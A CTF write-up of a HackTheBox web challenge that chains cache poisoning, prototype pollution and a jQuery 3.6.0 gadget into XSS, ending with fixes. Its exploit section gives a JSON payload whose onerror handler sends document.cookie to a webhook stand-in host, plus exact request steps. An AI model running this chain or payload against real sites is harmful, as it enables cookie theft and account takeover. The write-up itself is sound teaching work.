---
title: "REgregious — Cache Poisoning → Prototype Pollution → XSS"
published: 2026-08-31
description: "A three-bug chain: unkeyed cache inputs let you plant settings under the bot's key, a naive recursive merge pollutes Object.prototype, and a jQuery 3.6.0 gadget turns that into XSS on the bot."
tags: ["CTF", "Web", "Cache Poisoning", "Prototype Pollution", "XSS", "HackTheBox"]
category: CTF
draft: false
---

> **Target:** `http://154.57.164.68:30829` · Express · node-cache · jQuery 3.6.0 · Puppeteer bot
> **Vuln:** Web cache poisoning + prototype pollution + XSS (3-bug chain) · **Severity:** Critical

## Gist

The settings cache is keyed on the unkeyed `Host` and `X-Forwarded-For` headers, so you can plant *your* settings under the exact key the bot reads. Those settings pass through a recursive merge with no guard → client-side prototype pollution. Polluting `context` + `jquery` triggers a jQuery gadget that runs on the bot's next `$.ajax`, injecting an `<img onerror>` and stealing the flag cookie.

## Bug 1 — cache poisoning (unkeyed inputs)

```js
// routes/index.js — GET /api/settings
cacheKey = `_${req.headers.host}_${req.url}_${(req.headers['x-forwarded-for'] || req.ip)}`;
if (cache.has(cacheKey)) return res.send(JSON.parse(cache.get(cacheKey)));
return db.getUser(req.data.username).then(user => {
  cache.set(cacheKey, user.settings);   // caches THIS user's settings under an attacker-shaped key
  res.send(JSON.parse(user.settings));
});
```

The bot fetches `/api/settings` from `http://127.0.0.1:1337/` with no `X-Forwarded-For`, so its key is `_127.0.0.1:1337_/api/settings_127.0.0.1`. Sending `Host: 127.0.0.1:1337` and `X-Forwarded-For: 127.0.0.1` on *my* authenticated request reproduces that key exactly — and caches *my* saved settings there.

## Bug 2 — prototype pollution (unsafe merge)

The saved settings survive the round-trip verbatim, including `__proto__`. The bot's `restoreSettings()` feeds them into a naive recursive merge:

```js
// static/js/main.js — mergeSettings()
const mergeSettings = (target, source) => {
  for (let key in source) {
    if ((typeof target[key] === 'object') && (typeof source[key] === 'object'))
      mergeSettings(target[key], source[key]);   // key === "__proto__" → walks onto Object.prototype
    else target[key] = source[key];
  }
  return target;
};
```

With `source = {"__proto__": {…}}`, the recursion lands on `Object.prototype` and writes attacker keys onto it for the whole page.

## Bug 3 — jQuery 3.6.0 PP → XSS gadget

Unlike `url`, the ajax `context` option isn't set on the `buildStub` call, so it's read from the (polluted) prototype. jQuery's ajax init contains:

```js
// jquery-3.6.0.js — jQuery.ajax (line ~9420)
callbackContext = s.context || s,
globalEventContext = s.context &&
  ( callbackContext.nodeType || callbackContext.jquery ) ?
    jQuery( callbackContext ) :   // jQuery("<img src=x onerror=...>") → parses & loads → XSS
    jQuery.event,
```

Pollute `context` with an HTML string and `jquery` with any truthy value: `s.context` is truthy and `callbackContext.jquery` resolves to the polluted value, so jQuery runs `jQuery("<img src=x onerror=…>")`, which parses the markup and fires `onerror`. The bot clicks **Build The Stub** after restore, its `$.ajax` runs — and the gadget executes.

## Exploit

Poison payload (saved as the attacker's settings):

```json
{
  "ico_url": "x",
  "__proto__": {
    "context": "<img src=x onerror=\"new Image().src='//WEBHOOK/?c='+encodeURIComponent(document.cookie)\">",
    "jquery": "1"
  }
}
```

1. Grab an anonymous session (`GET /` auto-registers a user).
2. `POST /api/settings` with the poison body, sending `Host: 127.0.0.1:1337` + `X-Forwarded-For: 127.0.0.1`. This saves the poison to your row *and* deletes any stale entry under the bot's cache key.
3. `GET /api/settings` with the same `Host` + `XFF` → cache miss → your poison is now cached under the bot's key. (Verified the response echoes the `onerror` payload.)
4. `GET /api/stub/build` to trigger the bot. It loads the page, `restoreSettings()` pulls the poison from cache → pollution → the **Build** click's `$.ajax` fires the gadget → cookie exfiltrated.

   ```
   c = session=eyJ...; flag=HTB{p0is0n_4nd_p0llu7i0n_i5_7his_a_s0rc3ry?}
   ```

> **Gotcha:** Earlier attempts looked like `__proto__` was being stripped — it wasn't. The server round-trips it fine; the confusion was reading a stale cache entry under a different key. Prime the exact key *immediately* before triggering the bot (60s TTL).

## Flag

```
HTB{p0is0n_4nd_p0llu7i0n_i5_7his_a_s0rc3ry?}
```

## Takeaways

- Three individually-limited bugs chain into a critical: the cache poison delivers the pollution to the victim, and the jQuery gadget converts pollution into code execution.
- Unkeyed request inputs (`Host`, `X-Forwarded-For`) in a cache key let one user's data land under another's key — the essence of web cache poisoning.
- **Fix:** never build cache keys from attacker-controlled headers; guard recursive merges against `__proto__`/`constructor`/`prototype`; keep client libraries patched (jQuery ≥ 3.7 hardened this gadget).
